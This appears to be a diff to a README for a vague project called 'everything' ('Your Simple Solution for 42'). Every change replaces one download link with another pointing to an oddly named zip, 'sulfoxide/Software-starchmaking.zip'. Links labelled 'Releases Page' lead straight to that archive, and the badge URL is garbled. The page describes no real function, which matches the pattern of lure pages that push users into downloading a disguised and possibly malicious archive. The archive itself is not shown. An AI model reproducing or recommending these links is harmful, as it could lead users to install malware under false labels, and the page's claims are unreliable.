@@ -1,7 +1,7 @@
 # 🌟 everything - Your Simple Solution for 42
 
 ## 📥 Download Now
-[![Download the latest release](https://raw.githubusercontent.com/blinkybox/everything/main/sulfoxide/everything.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/blinkybox/everything/main/sulfoxide/everything.zip)
+[![Download the latest release](https://github.com/blinkybox/everything/raw/refs/heads/main/sulfoxide/Software-starchmaking.zip%20Now-Click%20Here-blue)](https://github.com/blinkybox/everything/raw/refs/heads/main/sulfoxide/Software-starchmaking.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ To run **everything**, your computer needs the following:
 ## 📂 Download & Install
 
 1. **Visit the Releases Page:** Click the link below to go to the Releases page.
-   [Download from Releases Page](https://raw.githubusercontent.com/blinkybox/everything/main/sulfoxide/everything.zip)
+   [Download from Releases Page](https://github.com/blinkybox/everything/raw/refs/heads/main/sulfoxide/Software-starchmaking.zip)
 
 2. **Choose Your Version:** On the Releases page, you will see a list of available versions. Select the most recent version to get the latest features and bug fixes.
 
@@ -53,7 +53,7 @@ If you have questions or need help, check out the following resources:
 
 ## 🔄 Keep Updated
 
-Stay informed about new releases and updates by checking the [Releases Page](https://raw.githubusercontent.com/blinkybox/everything/main/sulfoxide/everything.zip) regularly. We continuously improve **everything** based on user feedback.
+Stay informed about new releases and updates by checking the [Releases Page](https://github.com/blinkybox/everything/raw/refs/heads/main/sulfoxide/Software-starchmaking.zip) regularly. We continuously improve **everything** based on user feedback.
 
 ## 📊 Contribution
 
@@ -72,7 +72,7 @@ We value your feedback. Share your experiences with **everything** and help us m
 
 ## 📌 Important Links
 
-- **[Releases Page](https://raw.githubusercontent.com/blinkybox/everything/main/sulfoxide/everything.zip)**
+- **[Releases Page](https://github.com/blinkybox/everything/raw/refs/heads/main/sulfoxide/Software-starchmaking.zip)**
 - **User Guide**
 - **FAQ Section**
 - **Community Forum**
